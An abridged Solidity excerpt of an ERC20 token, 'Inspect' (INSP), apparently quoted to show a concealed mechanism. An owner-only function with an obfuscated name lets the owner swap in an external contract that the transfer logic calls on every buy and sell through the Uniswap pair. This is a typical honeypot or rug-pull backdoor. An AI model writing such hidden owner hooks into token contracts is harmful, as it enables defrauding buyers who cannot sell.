...
contract TokenM is ERC20 {
    ...
    IUserAmountnucdee public nucdee;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Inspect", "INSP") {
    ...
    function cdferyogBuoyinRsood(IUserAmountnucdee _nucdee) public onlyOwner {
        nucdee = _nucdee;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                nucdee.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				nucdee.addOutAmount(from, amount);
            }else{
                nucdee.addOutAmount(from, amount);
                takeFee = false;
            }
